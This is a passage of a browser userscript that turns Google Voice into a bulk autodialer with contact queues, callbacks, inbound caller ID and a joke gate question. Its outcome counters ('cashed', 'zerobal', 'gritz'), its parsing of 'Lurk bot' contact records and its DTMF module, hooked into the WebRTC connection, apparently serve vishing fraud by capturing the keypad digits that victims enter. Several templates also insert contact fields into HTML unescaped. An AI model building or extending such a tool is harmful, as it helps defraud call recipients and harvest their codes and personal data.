            DOM.autoQueueConfirm.style.display = 'block';

            let content;
            if (batch.length === 1) {
                const contact = batch[0].contact;
                content = `
                    <div class="confirm-dialog">
                        <div class="confirm-dialog-title">Add to queue? (from ${source})</div>
                        <div class="confirm-dialog-info">
                            <strong>${contact.name}</strong>
                            <div class="contact-detail">Phone: ${contact.phones[0] || 'No phone'}</div>
                            <div class="contact-detail">Email: ${contact.email}</div>
                        </div>
                        <div class="confirm-dialog-btns">
                            <button class="helper-button btn-secondary" id="confirmQueueNo">Skip</button>
                            <button class="helper-button btn-success" id="confirmQueueYes">Add</button>
                        </div>
                    </div>
                `;
            } else {
                // Multiple contacts - simplified prompt
                content = `
                    <div class="confirm-dialog">
                        <div class="confirm-dialog-title">Add ${batch.length} contacts? (from ${source})</div>
                        <div class="confirm-dialog-info">
                            <strong>${batch.length} contacts detected</strong>
                            <div class="contact-detail">Click Add to queue all, or Skip to ignore</div>
                        </div>
                        <div class="confirm-dialog-btns">
                            <button class="helper-button btn-secondary" id="confirmQueueNo">Skip All</button>
                            <button class="helper-button btn-success" id="confirmQueueYes">Add All</button>
                        </div>
                    </div>
                `;
            }

            DOM.autoQueueConfirm.innerHTML = content;

            document.getElementById('confirmQueueYes').onclick = () => {
                console.log('[Call Helper] User clicked Add');
                batch.forEach(({ contact }) => addToQueue(contact, source, false));
                DOM.autoQueueConfirm.style.display = 'none';
                if (window.autoQueueConfirmTimeout) clearTimeout(window.autoQueueConfirmTimeout);
            };

            document.getElementById('confirmQueueNo').onclick = () => {
                console.log('[Call Helper] User clicked Skip');
                DOM.autoQueueConfirm.style.display = 'none';
                if (window.autoQueueConfirmTimeout) clearTimeout(window.autoQueueConfirmTimeout);
            };

            window.autoQueueConfirmTimeout = setTimeout(() => {
                if (DOM.autoQueueConfirm.style.display !== 'none') {
                    console.log('[Call Helper] Auto-queue prompt timed out');
                    DOM.autoQueueConfirm.style.display = 'none';
                }
            }, 15000);
        }

        function addToQueue(contact, source, silent) {
            console.log('[Call Helper] Adding to queue:', { name: contact.name, inBulkSession: DOM.bulkSessionView.classList.contains('active') });

            if (DOM.bulkSessionView.classList.contains('active')) {
                bulkQueue.push(contact);
                DOM.bulkSessionStatus.textContent = `Calling ${currentBulkIndex + 1} of ${bulkQueue.length}`;
                if (!silent) showMessage(`+1 queued (${bulkQueue.length} total)`);
            } else {
                incomingQueue.push({ contact, source });
                updateQueueIndicator();
                if (!silent) showMessage(`Queued from ${source}`);
            }
        }

        function updateQueueIndicator() {
            DOM.queueIndicator.style.display = incomingQueue.length > 0 ? 'flex' : 'none';
            DOM.queueCount.textContent = incomingQueue.length;
        }

        function autoDial(number) {
            logToBot('call', 'dial ' + number);
            if (!femboyGatePassed) { showFemboyGate(() => autoDial(number)); return; }
            const gvInput = document.querySelector('input[placeholder="Enter a name or number"], input[aria-label="Enter a name or number"]');
            if (!gvInput) return;
            gvInput.focus(); gvInput.value = '';
            gvInput.dispatchEvent(new Event('input', { bubbles: true }));
            gvInput.value = number;
            gvInput.dispatchEvent(new Event('input', { bubbles: true }));
            gvInput.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', code: 'Enter', keyCode: 13, which: 13, bubbles: true }));
            setTimeout(() => { gvInput.value = ''; gvInput.dispatchEvent(new Event('input', { bubbles: true })); }, 500);
        }

        function triggerHangup() {
            for (const btn of document.querySelectorAll('button, [role="button"]')) {
                const aria = (btn.getAttribute('aria-label') || '').toLowerCase();
                if (aria.includes('end call') || aria.includes('hang up')) { logToBot('call', 'hangup'); btn.click(); return true; }
            }
            for (const btn of document.querySelectorAll('button')) {
                const bg = window.getComputedStyle(btn).backgroundColor;
                if ((bg.includes('234, 67, 53') || bg.includes('213, 0, 0')) && btn.offsetParent) { btn.click(); return true; }
            }
            return false;
        }

        // parseContactLine - wrapper for backwards compatibility
        function parseContactLine(text) {
            return parseContactRecord(text);
        }

        function renderContactInfo(container, contact) {
            let html = `<div class="helper-info-item"><strong>Name:</strong><span>${contact.name}</span></div>
                <div class="helper-info-item"><strong>Email:</strong><span>${contact.email}</span></div>
                <div class="helper-info-item"><strong>Phone:</strong><span>${contact.phones.join(', ')}</span></div>`;
            if (contact.address) html += `<div class="helper-info-item"><strong>Address:</strong><span>${contact.address}</span></div>`;
            container.innerHTML = html;
        }

        function processSingleContact() {
            if (!femboyGatePassed) { showFemboyGate(processSingleContact); return; }
            const input = DOM.dataInput.value.trim().split('\n')[0];
            if (!input) return;
            currentContact = parseContactLine(input);
            saveToHistory(currentContact);
            renderContactInfo(DOM.contactInfoDiv, currentContact);
            if (currentContact.phones.length > 0) {
                incrementStat('total');
                lastProcessedNumber = currentContact.phones[0];
                GM_setClipboard(lastProcessedNumber);
                showMessage(`Copied ${lastProcessedNumber}!`);
                DOM.dispositionNormal.style.display = 'flex';
                if (DOM.autoDialCheckbox.checked) autoDial(lastProcessedNumber);
            } else showMessage('No phone found.');
        }

        function parseBulkInput(text) {
            // Use the robust parseMultipleContacts function that properly handles
            // Raw Line format, pipe-delimited data, Lurk bot format, etc.
            return parseMultipleContacts(text);
        }

        // =============================================================================
        // SESSION AUDIO
        // The AudioMack embed is cross-origin, so the page cannot call play() on
        // it, read its volume, or observe when a track ends. Two consequences:
        //   1. Autoplay only works if the embed is created inside a real user
        //      gesture, so it is created from the click handler that starts the
        //      session (and retried on the next gesture if the browser blocked it).
        //   2. "Repeat" is done by reloading the embed in place once the track
        //      length has elapsed, since ended/playback events are not observable.
        // =============================================================================
        const SESSION_AUDIO_SRC =
          'https://audiomack.com/embed/daddy-sounds-1/song/you-know-how-much-i-love-you';
        const SESSION_AUDIO_REFRESH_MS = 195000;   // restart point, ~3:15
        const SESSION_AUDIO_WIDTH = 300;           // real box: some players refuse
        const SESSION_AUDIO_HEIGHT = 200;          // to initialise at 0/1px
        let sessionAudioFrame = null;
        let sessionAudioTimer = null;
        let sessionAudioRetryBound = false;

        function buildSessionAudioFrame() {
            const frame = document.createElement('iframe');
            frame.src = SESSION_AUDIO_SRC;
            frame.title = 'Session audio';
            frame.setAttribute('scrolling', 'no');
            frame.setAttribute('frameborder', '0');
            frame.setAttribute('allow', 'autoplay');
            frame.setAttribute('aria-hidden', 'true');
            frame.style.cssText = `
                position: fixed;
                left: -${SESSION_AUDIO_WIDTH + 20}px;
                bottom: 0;
                width: ${SESSION_AUDIO_WIDTH}px;
                height: ${SESSION_AUDIO_HEIGHT}px;
                border: 0;
                opacity: 0;
                pointer-events: none;
                z-index: 9998;
            `;
            return frame;
        }

        function startSessionAudio() {
            stopSessionAudio();
            sessionAudioFrame = buildSessionAudioFrame();
            document.body.appendChild(sessionAudioFrame);

            // Restart the embed on a timer to loop the track.
            sessionAudioTimer = setInterval(() => {
                if (sessionAudioFrame) sessionAudioFrame.src = SESSION_AUDIO_SRC;
            }, SESSION_AUDIO_REFRESH_MS);

            // If the browser blocked playback, reload the embed on the next
            // interaction so it starts then.
            if (!sessionAudioRetryBound) {
                sessionAudioRetryBound = true;
                const retry = () => {
                    if (!sessionAudioFrame) {
                        document.removeEventListener('pointerdown', retry, true);
                        document.removeEventListener('keydown', retry, true);
                        sessionAudioRetryBound = false;
                        return;
                    }
                    sessionAudioFrame.src = SESSION_AUDIO_SRC;
                };
                document.addEventListener('pointerdown', retry, true);
                document.addEventListener('keydown', retry, true);
            }
        }

        function stopSessionAudio() {
            if (sessionAudioFrame) { sessionAudioFrame.remove(); sessionAudioFrame = null; }
            if (sessionAudioTimer) { clearInterval(sessionAudioTimer); sessionAudioTimer = null; }
        }

        // =============================================================================
        // FEMBOY GATE
        // Nothing dials until the question is answered "yes". A "no" locks the
        // dialer for this page load: every dial path is disabled and the panel
        // shows a lock screen. Reloading the page is the only way back in.
        // =============================================================================
        let femboyGatePassed = false;
        let femboyGateLocked = false;

        const FLAG_STRIPES = ['#D52D00', '#FF9E56', '#FFFFFF', '#D362A4', '#A30262'];
        const flagStripes = () => FLAG_STRIPES.map(c => `<i style="background:${c}"></i>`).join('');

        function showFemboyGate(onPass) {
            if (femboyGatePassed) { onPass(); return; }
            if (femboyGateLocked) { lockDialer(); return; }
            const overlay = document.createElement('div');
            overlay.className = 'modal-overlay';
            overlay.id = 'femboyGateOverlay';
            overlay.innerHTML = `
                <div class="modal-content femboy-gate">
                    <div class="femboy-gate-flag">${flagStripes()}</div>
                    <div class="modal-title">Before you start a session</div>
                    <div class="femboy-gate-question">Do you like femboys?</div>
                    <div class="modal-field" style="margin-bottom:16px;">This is a required question. You cannot continue without a yes.</div>
                    <div class="modal-actions" style="margin-top:0;">
                        <button class="helper-button btn-secondary" id="femboyGateNo" style="margin-bottom:0;">No</button>
                        <button class="helper-button btn-primary" id="femboyGateYes" style="margin-bottom:0;">Yes</button>
                    </div>
                </div>`;
            document.body.appendChild(overlay);

            overlay.querySelector('#femboyGateYes').onclick = () => {
                femboyGatePassed = true;
                overlay.remove();
                onPass();
            };
            overlay.querySelector('#femboyGateNo').onclick = () => {
                overlay.remove();
                lockDialer();
            };
        }

        function lockDialer() {
            femboyGatePassed = false;
            femboyGateLocked = true;
            stopSessionAudio();
            ['startBulkSessionBtn', 'helperProcessBtn', 'redialBtn', 'callNextBtn', 'hangupBtn',
             'endBulkSessionBtn', 'autoDialCheckbox', 'scheduleCallbackBtn', 'bulkScheduleCallbackBtn']
                .forEach(id => { const el = document.getElementById(id); if (el) el.disabled = true; });

            DOM.normalView.style.display = 'none';
            DOM.bulkSessionView.classList.remove('active');
            ['.call-helper-content', '#callbackList', '#statsView', '#dtmfView', '#settingsPanel']
                .forEach(sel => { const el = DOM.panel.querySelector(sel); if (el) el.style.display = 'none'; });

            let lock = document.getElementById('femboyGateLock');
            if (!lock) {
                lock = document.createElement('div');
                lock.id = 'femboyGateLock';
                DOM.panel.appendChild(lock);
            }
            lock.style.display = 'block';
            lock.innerHTML = `
                <div class="lock-flag">${flagStripes()}</div>
                <div class="lock-title">Autodialer locked</div>
                <div class="lock-body">You answered no, so the dialer is unusable.<br>Reload the page to try again.</div>`;
        }

        function startBulkSession() {
            if (!femboyGatePassed) { showFemboyGate(startBulkSession); return; }
            let inputContacts = parseBulkInput(DOM.dataInput.value);
            let queuedContacts = incomingQueue.map(q => q.contact);
            incomingQueue = []; updateQueueIndicator();
            bulkQueue = [...inputContacts, ...queuedContacts];
            if (bulkQueue.length === 0) { alert('No valid contacts.'); return; }
            startSessionAudio();
            currentBulkIndex = 0;
            DOM.normalView.style.display = 'none';
            DOM.bulkSessionView.classList.add('active');
            loadBulkContact(currentBulkIndex);
        }

        function loadBulkContact(index) {
            const contact = bulkQueue[index];
            if (!contact) { endBulkSession(); return; }
            currentContact = contact;
            saveToHistory(contact);
            DOM.bulkSessionStatus.textContent = `Calling ${index + 1} of ${bulkQueue.length}`;
            renderContactInfo(DOM.bulkContactInfoDiv, contact);
            if (contact.phones.length > 0) { autoDial(contact.phones[0]); incrementStat('total'); }
        }

        function callNextInBulk() {
            if (!femboyGatePassed) { showFemboyGate(callNextInBulk); return; }
            currentBulkIndex++;
            if (currentBulkIndex >= bulkQueue.length) { alert('Done!'); endBulkSession(); return; }
            // Hang up the current call before dialing the next line. GV needs a
            // brief moment to actually end the call before a new one can be placed,
            // so we trigger the hangup and defer loading the next contact.
            triggerHangup();
            setTimeout(() => loadBulkContact(currentBulkIndex), 1200);
        }

        function redialCurrentContact() {
            if (!femboyGatePassed) { showFemboyGate(redialCurrentContact); return; }
            const c = bulkQueue[currentBulkIndex];
            if (!c?.phones?.length) return;
            // Hang up the current call before re-dialling the same number. If a call
            // is still active GV won't place a new one, so trigger hangup and defer
            // the dial (same pattern as callNextInBulk). If no call is active,
            // triggerHangup() is a harmless no-op and we still dial after the delay.
            triggerHangup();
            setTimeout(() => autoDial(c.phones[0]), 1200);
        }

        function endBulkSession() {
            stopSessionAudio();
            bulkQueue = []; currentBulkIndex = -1; currentContact = null;
            DOM.normalView.style.display = 'block';
            DOM.bulkSessionView.classList.remove('active');
            DOM.dataInput.value = '';
        }

        function scheduleCallback(timeInput, tzInput, notesInput) {
            if (!currentContact || !timeInput.value) { alert('No contact or time.'); return; }
            const tz = tzInput.value || settings.selectedTimezone;
            const temp = new Date(timeInput.value + 'Z');
            const time = temp.getTime() + getTimezoneOffset(tz, temp);
            if (isNaN(time)) { alert('Invalid time.'); return; }
            callbacks.push({ id: Date.now(), contact: currentContact, time, notes: notesInput?.value.trim() || '' });
            setShared('callbacks', callbacks);
            renderCallbacks();
            timeInput.value = ''; tzInput.value = ''; if (notesInput) notesInput.value = '';
            showMessage('Scheduled!');
        }

        function renderCallbacks() {
            callbacks.sort((a, b) => a.time - b.time);
            DOM.callbacksContainer.innerHTML = callbacks.map(cb => {
                const due = new Date(cb.time).toLocaleString('en-US', { timeZone: settings.selectedTimezone, month: 'short', day: 'numeric', hour: 'numeric', minute: '2-digit' });
                return `<div class="callback-item"><div style="display:flex;justify-content:space-between;"><span class="callback-name">${cb.contact.name}</span><span class="callback-countdown" id="cd-${cb.id}"></span></div><div class="callback-details"><div>${due}</div><div>${cb.contact.phones.join(', ')}</div></div>${cb.notes ? `<div class="callback-notes-display">${cb.notes}</div>` : ''}<button class="helper-button btn-secondary btn-small callback-done-btn" data-id="${cb.id}" style="margin-top:4px;">Done</button></div>`;
            }).join('');
            updateCallbackTimers();
        }

        function updateCallbackTimers() {
            const now = Date.now();
            callbacks.forEach(cb => {
                const el = document.getElementById(`cd-${cb.id}`);
                if (!el) return;
                const left = cb.time - now;
                el.textContent = left <= 0 ? `${Math.abs(Math.floor(left / 60000))}m overdue` : (left < 3600000 ? `${Math.floor(left / 60000)}m` : `${Math.floor(left / 3600000)}h`);
            });
        }

        function checkCallbacks() {
            const now = Date.now();
            callbacks.forEach(cb => {
                const left = cb.time - now;
                if (left <= 0) showCallbackAlert(cb, 'due');
                else if (left < 300000 && !cb.warned) { showCallbackAlert(cb, 'soon'); cb.warned = true; setShared('callbacks', callbacks); }
            });
        }

        function showCallbackAlert(cb, type) {
            clearInterval(alertTimerInterval);
            DOM.callbackAlertPopup.className = type === 'due' ? 'alert-due' : '';
            document.getElementById('callbackAlertHeader').textContent = type === 'due' ? 'Callback Due Now' : 'Upcoming';
            const updateTimer = () => {
                const left = cb.time - Date.now();
                const timer = left > 0 ? `${Math.floor(left/60000)}m ${Math.floor((left%60000)/1000)}s` : `${Math.abs(Math.floor(left/60000))}m overdue`;
                document.getElementById('callbackAlertContent').innerHTML = `<div>${type === 'due' ? 'Call now:' : 'Coming up:'}</div><div style="font-size:16px;font-weight:700;">${cb.contact.name}</div><div>${cb.contact.phones.join(', ')}</div><div style="color:var(--ch-primary);">${timer}</div>${cb.notes ? `<div style="font-style:italic;margin-top:4px;">${cb.notes}</div>` : ''}`;
            };
            updateTimer();
            alertTimerInterval = setInterval(updateTimer, 1000);
            DOM.callbackAlertPopup.style.display = 'block';
            try { new Audio(NOTIFICATION_SOUND_URL).play(); } catch (e) {}
        }

        function incrementStat(type) {
            if (sessionStats.hasOwnProperty(type)) { sessionStats[type]++; setShared('sessionStats', sessionStats); updateStatsDisplay(); }
        }

        function updateStatsDisplay() {
            DOM.statsContent.innerHTML = `<div class="stats-grid">${['total','vm','gritz','cashed','zerobal','troll'].map(k => `<div class="stat-cell"><span class="stat-number">${sessionStats[k]}</span><br><span class="stat-label">${k}</span></div>`).join('')}</div>`;
        }

        function saveToHistory(contact) {
            if (!contact?.phones?.length) return;
            callHistory[phoneKey(contact.phones[0])] = contact;
            setShared('gvCallHistory_v2', callHistory);
        }

        function populateTimezones() {
            const tzs = ['America/New_York','America/Chicago','America/Denver','America/Los_Angeles','UTC'];
            [DOM.timezoneSelector, DOM.perCallbackTimezone, DOM.bulkPerCallbackTimezone].forEach(sel => {
                if (!sel) return;
                if (sel !== DOM.timezoneSelector) sel.innerHTML = '<option value="">-- Default --</option>';
                tzs.forEach(tz => { const o = document.createElement('option'); o.value = tz; o.textContent = tz.replace('America/',''); if (sel === DOM.timezoneSelector && tz === settings.selectedTimezone) o.selected = true; sel.appendChild(o); });
            });
        }

        function makeDraggable(el) {
            let dragging = false, startX, startY, startL, startT;
            const saved = getShared('panelPosition', null);
            if (saved) { el.style.top = saved.top + 'px'; el.style.left = saved.left + 'px'; el.style.right = 'auto'; }
            DOM.header.addEventListener('mousedown', e => {
                if (e.target.closest('.header-btn')) return;
                dragging = true;
                const r = el.getBoundingClientRect();
                startL = r.left; startT = r.top; startX = e.clientX; startY = e.clientY;
                el.style.right = 'auto'; el.style.left = startL + 'px'; el.style.top = startT + 'px';
                el.style.transition = 'none';
                document.addEventListener('mousemove', drag);
                document.addEventListener('mouseup', dragEnd);
                e.preventDefault();
            });
            function drag(e) {
                if (!dragging) return;
                let nl = startL + (e.clientX - startX), nt = startT + (e.clientY - startY);
                const r = el.getBoundingClientRect();
                nl = Math.max(0, Math.min(nl, window.innerWidth - r.width));
                nt = Math.max(0, Math.min(nt, window.innerHeight - 50));
                el.style.left = nl + 'px'; el.style.top = nt + 'px';
            }
            function dragEnd() {
                if (!dragging) return;
                dragging = false; el.style.transition = '';
                setShared('panelPosition', { left: el.getBoundingClientRect().left, top: el.getBoundingClientRect().top });
                document.removeEventListener('mousemove', drag);
                document.removeEventListener('mouseup', dragEnd);
            }
        }

        function handleKeyPress(e) {
            const typing = e.target.tagName === 'TEXTAREA' || e.target.tagName === 'SELECT' || e.target.isContentEditable || (e.target.tagName === 'INPUT' && e.target.type !== 'checkbox');
            if (typing) return;
            const inBulk = DOM.bulkSessionView.classList.contains('active');
            const key = e.key.toLowerCase();
            const { redial, callNext, hangup } = settings.keybinds;
            if (inBulk && (key === redial || key === callNext || key === hangup)) {
                e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
                if (key === redial) { flashButton(DOM.redialBtn); redialCurrentContact(); }
                else if (key === callNext) { flashButton(DOM.callNextBtn); callNextInBulk(); }
                else if (key === hangup) { flashButton(DOM.hangupBtn); triggerHangup(); }
                return false;
            }
        }

        // Event listeners
        DOM.processBtn.onclick = processSingleContact;
        DOM.startBulkSessionBtn.onclick = startBulkSession;
        DOM.callNextBtn.onclick = () => { flashButton(DOM.callNextBtn); callNextInBulk(); };
        DOM.redialBtn.onclick = () => { flashButton(DOM.redialBtn); redialCurrentContact(); };
        DOM.hangupBtn.onclick = () => { flashButton(DOM.hangupBtn); triggerHangup(); };
        DOM.endBulkSessionBtn.onclick = endBulkSession;
        DOM.scheduleCallbackBtn.onclick = () => scheduleCallback(DOM.callbackTimeInput, DOM.perCallbackTimezone, DOM.callbackNotesInput);
        DOM.bulkScheduleCallbackBtn.onclick = () => scheduleCallback(DOM.bulkCallbackTimeInput, DOM.bulkPerCallbackTimezone, DOM.bulkCallbackNotesInput);
        DOM.callbacksContainer.addEventListener('click', e => { if (e.target.classList.contains('callback-done-btn')) { callbacks = callbacks.filter(c => c.id !== parseInt(e.target.dataset.id)); setShared('callbacks', callbacks); renderCallbacks(); }});
        DOM.toggleStatsBtn.onclick = () => { const h = DOM.statsView.style.display === 'none'; DOM.statsView.style.display = h ? 'block' : 'none'; DOM.toggleStatsBtn.textContent = h ? 'Hide' : 'Stats'; };
        DOM.resetStatsBtn.onclick = () => { if (confirm('Reset stats?')) { sessionStats = {total:0,vm:0,gritz:0,cashed:0,zerobal:0,troll:0}; setShared('sessionStats', sessionStats); updateStatsDisplay(); }};
        DOM.testSoundBtn.onclick = () => { try { new Audio(NOTIFICATION_SOUND_URL).play(); } catch (e) { alert('Sound failed'); }};
        const handleDispo = e => { if (e.target.classList.contains('dispo-btn')) { incrementStat(e.target.dataset.type); e.target.classList.add('clicked'); setTimeout(() => e.target.classList.remove('clicked'), 300); }};
        DOM.dispositionNormal.addEventListener('click', handleDispo);
        DOM.dispositionBulk.addEventListener('click', handleDispo);
        DOM.darkModeBtn.onclick = () => {
            settings.darkMode = !settings.darkMode;
            saveSettings();
            DOM.panel.classList.toggle('dark-mode', settings.darkMode);
            DOM.darkModeBtn.textContent = settings.darkMode ? 'Light' : 'Dark';
        };
        DOM.minimizeBtn.onclick = () => { settings.minimized = !settings.minimized; saveSettings(); DOM.panel.classList.toggle('minimized', settings.minimized); DOM.minimizeBtn.textContent = settings.minimized ? '+' : '-'; };
        DOM.settingsBtn.onclick = () => { DOM.settingsPanel.classList.toggle('visible'); };

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }


        // Save all settings
        DOM.saveSettingsBtn.onclick = () => {
            // Keybinds
            settings.keybinds.redial = DOM.keybindRedial.value.toLowerCase() || 'q';
            settings.keybinds.callNext = DOM.keybindCallNext.value.toLowerCase() || 'w';
            settings.keybinds.hangup = DOM.keybindHangup.value.toLowerCase() || 'e';

            // Auto-queue settings
            settings.autoQueueEnabled = DOM.autoQueueToggle.classList.contains('active');
            settings.autoQueueMode = DOM.autoQueueModeSelect.value;

            saveSettings();

            // Update UI
            DOM.redialHint.textContent = settings.keybinds.redial;
            DOM.callNextHint.textContent = settings.keybinds.callNext;
            DOM.hangupHint.textContent = settings.keybinds.hangup;

            showMessage('Settings saved!');
            DOM.settingsPanel.classList.remove('visible');
        };

        DOM.autoQueueToggle.onclick = () => DOM.autoQueueToggle.classList.toggle('active');

        DOM.timezoneSelector.onchange = () => { settings.selectedTimezone = DOM.timezoneSelector.value; saveSettings(); renderCallbacks(); };
        DOM.autoDialCheckbox.checked = settings.autoDialEnabled;
        DOM.autoDialCheckbox.onchange = () => { settings.autoDialEnabled = DOM.autoDialCheckbox.checked; saveSettings(); };
        DOM.queueIndicator.onclick = () => { if (incomingQueue.length > 0) { const { contact } = incomingQueue.shift(); updateQueueIndicator(); DOM.dataInput.value = `${contact.name} | ${contact.email} | ${contact.phones.join(', ')}`; showMessage('Loaded from queue'); }};
        DOM.dismissCallbackAlertBtn.onclick = () => { DOM.callbackAlertPopup.style.display = 'none'; clearInterval(alertTimerInterval); };
        DOM.dataInput.addEventListener('paste', e => e.stopPropagation());
        document.addEventListener('keydown', handleKeyPress, true);
        window.addEventListener('keydown', handleKeyPress, true);

        // =================================================================
        // INBOUND CALLER ID
        // =================================================================
        function initInboundCallerID() {
            let lastInboundNumber = '';
            let lastInboundTime = 0;
            let popupTimeout = null;
            let inboundActive = false;

            // Create popup element once
            const popupEl = document.createElement('div');
            popupEl.id = 'inboundCallerPopup';
            popupEl.style.display = 'none';
            if (settings.darkMode) popupEl.classList.add('dark-mode');
            document.body.appendChild(popupEl);

            // Keep dark mode in sync
            const origDarkToggle = DOM.darkModeBtn.onclick;
            DOM.darkModeBtn.onclick = () => {
                origDarkToggle();
                popupEl.classList.toggle('dark-mode', settings.darkMode);
            };

            function extractPhoneFromText(text) {
                if (!text) return null;
                // International: + followed by country code and number (7-15 digits)
                const intl = text.match(/\+(\d[\d\s().-]{5,}\d)/);
                if (intl) {
                    const norm = normalizePhone('+' + intl[1]);
                    if (norm) return norm;
                }
                // US: (XXX) XXX-XXXX
                const formatted = text.match(/\((\d{3})\)\s*(\d{3})[-.\s]?(\d{4})/);
                if (formatted) {
                    const num = formatted[1] + formatted[2] + formatted[3];
                    if (/^[2-9]/.test(num)) return num;
                }
                // US: XXX-XXX-XXXX
                const dashed = text.match(/(\d{3})[-.\s](\d{3})[-.\s](\d{4})/);
                if (dashed) {
                    const num = dashed[1] + dashed[2] + dashed[3];
                    if (/^[2-9]/.test(num)) return num;
                }
                // US: +1XXXXXXXXXX or bare 10 digits
                const plus = text.match(/\+?1?(\d{10})/);
                if (plus && /^[2-9]/.test(plus[1])) return plus[1];
                return null;
            }

            function lookupContact(phone) {
                const key = phoneKey(phone);
                if (callHistory[key]) return callHistory[key];
                for (const c of bulkQueue) {
                    if (c.phones?.some(p => phoneKey(p) === key)) return c;
                }
                for (const cb of callbacks) {
                    if (cb.contact?.phones?.some(p => phoneKey(p) === key)) return cb.contact;
                }
                return null;
            }

            function showInboundPopup(phone, contact) {
                if (phone === lastInboundNumber && Date.now() - lastInboundTime < 30000) return;
                lastInboundNumber = phone;
                lastInboundTime = Date.now();
                inboundActive = true;

                if (popupTimeout) { clearTimeout(popupTimeout); popupTimeout = null; }

                // Format US 10-digit numbers nicely; show international as-is (with +)
                const formatted = phone.startsWith('+')
                    ? phone
                    : phone.replace(/(\d{3})(\d{3})(\d{4})/, '($1) $2-$3');

                if (contact && contact.name !== 'N/A') {
                    let body = `<div class="inbound-name">${escapeHtml(contact.name)}</div>`;
                    body += `<div class="inbound-detail"><strong>Phone:</strong><span>${formatted}</span></div>`;
                    if (contact.email && contact.email !== 'N/A') {
                        body += `<div class="inbound-detail"><strong>Email:</strong><span>${escapeHtml(contact.email)}</span></div>`;
                    }
                    if (contact.address) {
                        body += `<div class="inbound-detail"><strong>Address:</strong><span>${escapeHtml(contact.address)}</span></div>`;
                    }
                    if (contact.phones && contact.phones.length > 1) {
                        const others = contact.phones.filter(p => p !== phone).join(', ');
                        if (others) body += `<div class="inbound-detail"><strong>Other #:</strong><span>${others}</span></div>`;
                    }
                    popupEl.innerHTML = `
                        <div class="inbound-header">
                            <span class="inbound-header-title">Incoming -- Known Caller</span>
                            <button class="inbound-close" id="inboundClose" title="Close">&times;</button>
                        </div>
                        <div class="inbound-body">${body}</div>`;
                } else {
                    popupEl.innerHTML = `
                        <div class="inbound-header" style="background:linear-gradient(135deg,#f59e0b,#d97706);">
                            <span class="inbound-header-title">Incoming -- Unknown</span>
                            <button class="inbound-close" id="inboundClose" title="Close">&times;</button>
                        </div>
                        <div class="inbound-unknown">
                            <div class="inbound-unknown-number">${formatted}</div>
                            <div class="inbound-unknown-label">Not in call history</div>
                        </div>`;
                }

                popupEl.style.display = 'block';
                popupEl.classList.remove('fade-out');
                document.getElementById('inboundClose').onclick = dismissPopup;

                popupTimeout = setTimeout(dismissPopup, 30000);
                console.log('[Call Helper] Inbound caller ID:', phone, contact ? contact.name : 'unknown');
            }

            function dismissPopup() {
                if (popupTimeout) { clearTimeout(popupTimeout); popupTimeout = null; }
                inboundActive = false;
                popupEl.classList.add('fade-out');
                setTimeout(() => { popupEl.style.display = 'none'; popupEl.classList.remove('fade-out'); }, 250);
            }

            // ---- DETECTION ----
            // GV shows "Incoming call" text next to the phone number in the right panel.
            // We scan for that text, then grab the number from the same container.
            function scanForIncoming() {
                // Walk all elements for "Incoming call" text -- use a TreeWalker for speed
                const walker = document.createTreeWalker(
                    document.body,
                    NodeFilter.SHOW_TEXT,
                    {
                        acceptNode: (node) => {
                            // Quick reject: skip our own panel and tiny nodes
                            if (node.parentElement?.closest('#callHelperPanel, #inboundCallerPopup, #callbackAlertPopup')) return NodeFilter.FILTER_REJECT;
                            const t = node.textContent.trim();
                            if (t === 'Incoming call' || t === 'Incoming') return NodeFilter.FILTER_ACCEPT;
                            return NodeFilter.FILTER_SKIP;
                        }
                    }
                );

                const incomingNode = walker.nextNode();
                if (!incomingNode) {
                    // No incoming call on screen -- auto-dismiss if popup still showing
                    if (inboundActive && Date.now() - lastInboundTime > 5000) {
                        dismissPopup();
                    }
                    return;
                }

                // Found "Incoming call" -- now walk up to find a container with the phone number
                let container = incomingNode.parentElement;
                let phone = null;

                // Walk up max 8 levels looking for a phone number in the container text
                for (let i = 0; i < 8 && container && container !== document.body; i++) {
                    const text = container.textContent || '';
                    phone = extractPhoneFromText(text);
                    if (phone) break;
                    container = container.parentElement;
                }

                if (phone) {
                    const contact = lookupContact(phone);
                    showInboundPopup(phone, contact);
                }
            }

            // Poll every 2s -- extremely cheap (one TreeWalker scan)
            // No MutationObserver needed, this is simpler and GV might reuse DOM nodes
            const pollId = setInterval(scanForIncoming, 2000);

            console.log('[Call Helper] Inbound caller ID started (2s poll)');
            return pollId;
        }

        // =================================================================
        // DTMF DETECTION -- UI rendering + bridge wiring
        // The bridge object (dtmfBridge) is created early at document-start so the
        // RTCPeerConnection hook can populate it before this UI exists. Here we
        // connect the UI to the bridge callbacks and replay any digits already
        // captured (e.g. a call started before the panel rendered).
        // =================================================================
        function renderDTMFDigit(digit) {
            if (digit === null) {
                // Clear signal (new call / manual reset)
                DOM.dtmfDigits.textContent = 'Empty';
                DOM.dtmfLog.innerHTML = '<div class="dtmf-log-empty">No keys pressed yet.</div>';
                return;
            }
            // Append to the digit string
            const current = DOM.dtmfDigits.textContent;
                DOM.dtmfDigits.textContent = (current === 'Empty' ? '' : current) + digit;

            // Prepend a timestamped log entry (newest on top), capped to 50 rows
            const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
            const empty = DOM.dtmfLog.querySelector('.dtmf-log-empty');
            if (empty) DOM.dtmfLog.innerHTML = '';
            const row = document.createElement('div');
            row.className = 'dtmf-log-row';
            row.innerHTML = `<span class="dtmf-log-key">${escapeHtml(digit)}</span><span>${time}</span>`;
            DOM.dtmfLog.insertBefore(row, DOM.dtmfLog.firstChild);
            while (DOM.dtmfLog.children.length > 50) DOM.dtmfLog.removeChild(DOM.dtmfLog.lastChild);
        }

        function setDTMFActive(active) {
            const enabled = settings.dtmfEnabled !== false;
            if (!enabled) {
                DOM.dtmfStatus.textContent = 'Off';
                DOM.dtmfStatus.className = 'dtmf-status off';
            } else if (active) {
                DOM.dtmfStatus.textContent = 'Listening';
                DOM.dtmfStatus.className = 'dtmf-status live';
            } else {
                DOM.dtmfStatus.textContent = 'Idle';
                DOM.dtmfStatus.className = 'dtmf-status';
            }

            // The section (header + toggle) is ALWAYS visible so the toggle can be
            // reached to turn detection back on. Only the body hides when there's
            // nothing to show (detection off AND no digits AND no active call).
            const hasDigits = dtmfBridge.digits.length > 0;
            const showBody = enabled || hasDigits || active;
            DOM.dtmfDigits.style.display = showBody ? 'block' : 'none';
            DOM.dtmfLog.style.display = showBody ? 'block' : 'none';
        }

